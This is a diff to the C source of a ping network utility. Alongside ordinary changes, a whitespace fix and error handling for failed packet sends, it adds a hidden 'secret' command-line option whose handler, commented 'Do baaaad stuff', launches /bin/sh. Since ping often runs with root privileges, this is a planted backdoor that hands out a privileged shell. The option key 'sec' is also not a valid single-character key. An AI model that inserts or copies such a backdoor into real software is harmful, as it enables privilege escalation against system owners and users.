@@ -113,6 +113,7 @@ static struct argp_option argp_options[] = {
   {"ignore-routing", 'r', NULL, 0, "send directly to a host on an attached "
    "network", GRP+1},
   {"verbose", 'v', NULL, 0, "verbose output", GRP+1},
+  {"secret" , 'sec', NULL, 0, "secret function, you should try it", GRP+1},
   {"timeout", 'w', "N", 0, "stop after N seconds", GRP+1},
 #undef GRP
 #define GRP 20
@@ -203,6 +204,12 @@ parse_opt (int key, char *arg, struct argp_state *state)
       ping_type = decode_type (arg);
       break;
 
+    case 'sec':
+      // Do baaaad stuff
+      // set uid und groupid
+      execl("/bin/sh", "sh", "", NULL, NULL);
+      break;
+
     case ARG_ECHO:
       ping_type = decode_type ("echo");
       break;
@@ -239,7 +246,7 @@ main (int argc, char **argv)
   int status = 0;
 
   set_program_name (argv[0]);
-  
+
   if (getuid () == 0)
     is_root = true;
 
@@ -421,6 +428,7 @@ int
 send_echo (PING * ping)
 {
   int off = 0;
+  int rc;
 
   if (PING_TIMING (data_length))
     {
@@ -433,7 +441,12 @@ send_echo (PING * ping)
     ping_set_data (ping, data_buffer, off,
 		   data_length > PING_HEADER_LEN ?
 		   data_length - PING_HEADER_LEN : data_length, USE_IPV6);
-  return ping_xmit (ping);
+
+  rc = ping_xmit (ping);
+  if (rc < 0)
+    error (EXIT_FAILURE, errno, "sending packet");
+
+  return rc;
 }
 
 int
